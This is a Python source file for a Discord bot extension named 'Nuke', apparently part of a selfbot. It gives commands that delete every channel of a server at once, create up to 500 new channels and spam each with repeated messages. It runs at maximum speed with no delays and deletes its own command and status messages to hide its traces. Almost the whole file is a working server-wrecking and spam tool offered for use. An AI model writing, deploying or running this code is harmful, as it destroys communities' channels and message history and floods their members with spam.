"""
NUKE COMMANDS - Master nuke with create, spam all in one
All commands run at maximum speed
Owner only visibility
"""
import discord
from discord.ext import commands
from config import OWNER_ID
import asyncio

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.is_nuking = False

    def is_owner(self, ctx):
        """Check if user is owner"""
        return ctx.author.id == OWNER_ID

    @commands.command(name='help')
    @commands.check(is_owner)
    async def show_help(self, ctx):
        """Show all commands - OWNER ONLY"""
        embed = discord.Embed(
            title="🚀 ALPHA SELFBOT - COMMANDS (OWNER ONLY)",
            description="Secret commands - Owner access only",
            color=discord.Color.red()
        )

        commands_info = {
            "MASTER NUKE": [
                ("`.nuke <ch_count> <ch_name> <spam_count> <message>`", "DELETE ALL + CREATE + SPAM ALL"),
                ("`.nuke`", "Delete ALL channels only"),
            ],
            "CREATE": [
                ("`.createchannels <count> <name>`", "Create channels"),
                ("`.create <count> <name>`", "Quick create"),
            ],
            "SPAM": [
                ("`.spam <count> <#channel> <message>`", "Spam in channel"),
                ("`.spamall <count> <message>`", "Spam all channels"),
            ],
            "INFO": [
                ("`.owner`", "Owner info"),
                ("`.serverinfo`", "Server info"),
                ("`.ping`", "Latency"),
            ]
        }

        for category, cmds in commands_info.items():
            cmd_list = "\n".join([f"{cmd[0]:<55} {cmd[1]}" for cmd in cmds])
            embed.add_field(name=category, value=f"```\n{cmd_list}\n```", inline=False)

        embed.set_footer(text="⚡ MAXIMUM SPEED • NO DELAYS • OWNER ONLY")
        await ctx.send(embed=embed, delete_after=30)

    @commands.command(name='nuke')
    @commands.check(is_owner)
    async def nuke_server(self, ctx, channel_count: int = None, channel_name: str = None, spam_count: int = None, *, message: str = None):
        """
        MASTER NUKE - Everything at once at MAXIMUM SPEED!
        Owner only - command deletes after completion
        """
        if self.is_nuking:
            msg = await ctx.send("⚠️ Nuke in progress")
            await asyncio.sleep(3)
            await msg.delete()
            return

        if not ctx.guild.me.guild_permissions.manage_channels:
            msg = await ctx.send("❌ No manage channels permission")
            await asyncio.sleep(3)
            await msg.delete()
            return

        # Delete the command message immediately
        try:
            await ctx.message.delete()
        except:
            pass

        # If no parameters, just delete channels
        if channel_count is None:
            await self._delete_all_channels(ctx)
            return

        # Validate parameters
        if channel_count <= 0 or channel_count > 500:
            msg = await ctx.send("❌ Count: 1-500")
            await asyncio.sleep(3)
            await msg.delete()
            return

        if spam_count is None or spam_count <= 0 or spam_count > 100:
            msg = await ctx.send("❌ Spam: 1-100")
            await asyncio.sleep(3)
            await msg.delete()
            return

        if not message:
            msg = await ctx.send("❌ Message required")
            await asyncio.sleep(3)
            await msg.delete()
            return

        if len(message) > 2000:
            msg = await ctx.send("❌ Message too long")
            await asyncio.sleep(3)
            await msg.delete()
            return

        self.is_nuking = True
        
        # Confirmation message (owner only, deletes after)
        confirm_msg = await ctx.send(
            f"⚠️ **MASTER NUKE**\n"
            f"🗑️ Delete ALL channels\n"
            f"➕ Create {channel_count} x '{channel_name}'\n"
            f"📢 Spam {spam_count}x: '{message}'\n\n"
            f"React ✓ (30s)"
        )
        await confirm_msg.add_reaction("✓")

        try:
            reaction, user = await self.bot.wait_for(
                'reaction_add',
                check=lambda r, u: u.id == ctx.author.id and str(r.emoji) == "✓",
                timeout=30
            )
        except asyncio.TimeoutError:
            try:
                await confirm_msg.delete()
            except:
                pass
            self.is_nuking = False
            return

        try:
            await confirm_msg.delete()
        except:
            pass

        # Start progress message
        progress_msg = await ctx.send("🚀 NUKE START")

        # STEP 1: Delete all channels (MAX SPEED)
        deleted_count = await self._delete_all_channels_async(ctx)
        await progress_msg.edit(content=f"✓ Deleted {deleted_count} | ⏳ Creating {channel_count}...")

        # STEP 2: Create all channels (MAX SPEED - PARALLEL)
        created_channels = await self._create_all_channels_async(ctx.guild, channel_count, channel_name)
        created_count = len(created_channels)
        await progress_msg.edit(content=f"✓ Deleted {deleted_count} | ✓ Created {created_count} | ⏳ Spamming...")

        # STEP 3: Spam all channels (MAX SPEED - PARALLEL)
        spammed_count = await self._spam_all_channels_async(created_channels, spam_count, message)
        
        # Final summary (deletes after 10 seconds)
        embed = discord.Embed(
            title="✅ MASTER NUKE COMPLETE",
            description="All operations executed",
            color=discord.Color.green()
        )
        embed.add_field(name="🗑️ Deleted", value=deleted_count, inline=True)
        embed.add_field(name="➕ Created", value=created_count, inline=True)
        embed.add_field(name="📢 Spammed", value=spammed_count, inline=True)
        embed.add_field(name="⚡ Speed", value="MAXIMUM", inline=False)
        
        await progress_msg.edit(content=None, embed=embed)
        
        # Auto delete after 10 seconds
        await asyncio.sleep(10)
        try:
            await progress_msg.delete()
        except:
            pass

        self.is_nuking = False

    async def _delete_all_channels(self, ctx):
        """Delete all channels with confirmation"""
        msg = await ctx.send("⚠️ DELETE ALL? ✓ (30s)")
        await msg.add_reaction("✓")

        try:
            await self.bot.wait_for(
                'reaction_add',
                check=lambda r, u: u.id == ctx.author.id and str(r.emoji) == "✓",
                timeout=30
            )
        except asyncio.TimeoutError:
            try:
                await msg.delete()
            except:
                pass
            return

        deleted_count = await self._delete_all_channels_async(ctx)

        embed = discord.Embed(
            title="✓ DELETED",
            description=f"{deleted_count} channels",
            color=discord.Color.red()
        )
        
        final_msg = await ctx.send(embed=embed)
        
        # Auto delete
        await asyncio.sleep(10)
        try:
            await msg.delete()
            await final_msg.delete()
        except:
            pass

    async def _delete_all_channels_async(self, ctx):
        """Delete all channels asynchronously (NO DELAY)"""
        channels = list(ctx.guild.channels)
        tasks = [self._delete_channel(channel) for channel in channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return sum(1 for r in results if r is True)

    async def _delete_channel(self, channel):
        """Helper: Delete channel (fire and forget)"""
        try:
            await channel.delete()
            return True
        except:
            return False

    async def _create_all_channels_async(self, guild, count, name):
        """Create all channels asynchronously (PARALLEL - NO DELAY)"""
        tasks = []
        for i in range(1, count + 1):
            channel_name = f"{name}-{i}".lower()[:100]
            tasks.append(self._create_channel_async(guild, channel_name))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [r for r in results if r is not None]

    async def _create_channel_async(self, guild, name):
        """Helper: Create channel and return object"""
        try:
            channel = await guild.create_text_channel(name)
            return channel
        except:
            return None

    async def _spam_all_channels_async(self, channels, spam_count, message):
        """Spam all channels simultaneously (PARALLEL - NO DELAY)"""
        tasks = []
        total_messages = 0

        for channel in channels:
            if isinstance(channel, discord.TextChannel):
                for i in range(spam_count):
                    msg_content = f"{message}"
                    tasks.append(self._send_message(channel, msg_content))
                    total_messages += 1

        # Send all messages at once (MAXIMUM SPEED)
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return sum(1 for r in results if r is True)

    async def _send_message(self, channel, content):
        """Helper: Send message (fire and forget)"""
        try:
            await channel.send(content)
            return True
        except:
            return False

    @commands.command(name='deletechannels')
    @commands.check(is_owner)
    async def delete_channels_alias(self, ctx):
        """Delete all channels - OWNER ONLY"""
        try:
            await ctx.message.delete()
        except:
            pass
        await self.nuke_server(ctx)

    @commands.command(name='createchannels')
    @commands.check(is_owner)
    async def create_channels(self, ctx, count: int, *, name: str):
        """Create channels at MAXIMUM SPEED - OWNER ONLY"""
        try:
            await ctx.message.delete()
        except:
            pass

        if not ctx.guild.me.guild_permissions.manage_channels:
            msg = await ctx.send("❌ No permission")
            await asyncio.sleep(3)
            await msg.delete()
            return

        if count <= 0 or count > 500:
            msg = await ctx.send("❌ Count: 1-500")
            await asyncio.sleep(3)
            await msg.delete()
            return

        status_msg = await ctx.send(f"⚡ Creating {count} channels...")

        # Create all simultaneously (PARALLEL)
        tasks = []
        for i in range(1, count + 1):
            channel_name = f"{name}-{i}".lower()[:100]
            tasks.append(self._create_channel_async(ctx.guild, channel_name))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        created_count = sum(1 for r in results if r is not None)

        embed = discord.Embed(
            title="✓ CREATED",
            description=f"{created_count}/{count} channels",
            color=discord.Color.green()
        )
        
        await status_msg.edit(embed=embed)
        await asyncio.sleep(10)
        try:
            await status_msg.delete()
        except:
            pass

    @commands.command(name='create')
    @commands.check(is_owner)
    async def create_alias(self, ctx, count: int, *, name: str):
        """Quick create - OWNER ONLY"""
        await self.create_channels(ctx, count, name=name)

    @commands.command(name='owner')
    @commands.check(is_owner)
    async def show_owner(self, ctx):
        """Owner info - OWNER ONLY"""
        try:
            await ctx.message.delete()
        except:
            pass

        owner = await self.bot.fetch_user(OWNER_ID)
        embed = discord.Embed(
            title="👑 OWNER",
            color=discord.Color.gold()
        )
        embed.add_field(name="Username", value=owner.name)
        embed.add_field(name="ID", value=owner.id)
        embed.set_thumbnail(url=owner.avatar.url if owner.avatar else None)
        
        msg = await ctx.send(embed=embed)
        await asyncio.sleep(15)
        try:
            await msg.delete()
        except:
            pass

    @commands.command(name='serverinfo')
    @commands.check(is_owner)
    async def server_info(self, ctx):
        """Server info - OWNER ONLY"""
        try:
            await ctx.message.delete()
        except:
            pass

        guild = ctx.guild
        embed = discord.Embed(
            title=f"📊 {guild.name}",
            color=discord.Color.blue()
        )
        embed.add_field(name="ID", value=guild.id)
        embed.add_field(name="Members", value=guild.member_count)
        embed.add_field(name="Channels", value=len(guild.channels))
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        
        msg = await ctx.send(embed=embed)
        await asyncio.sleep(15)
        try:
            await msg.delete()
        except:
            pass

    @commands.command(name='ping')
    @commands.check(is_owner)
    async def ping(self, ctx):
        """Latency - OWNER ONLY"""
        try:
            await ctx.message.delete()
        except:
            pass

        latency = round(self.bot.latency * 1000)
        embed = discord.Embed(
            title="⚡ PING",
            description=f"{latency}ms",
            color=discord.Color.yellow()
        )
        
        msg = await ctx.send(embed=embed)
        await asyncio.sleep(5)
        try:
            await msg.delete()
        except:
            pass

async def setup(bot):
    await bot.add_cog(Nuke(bot))
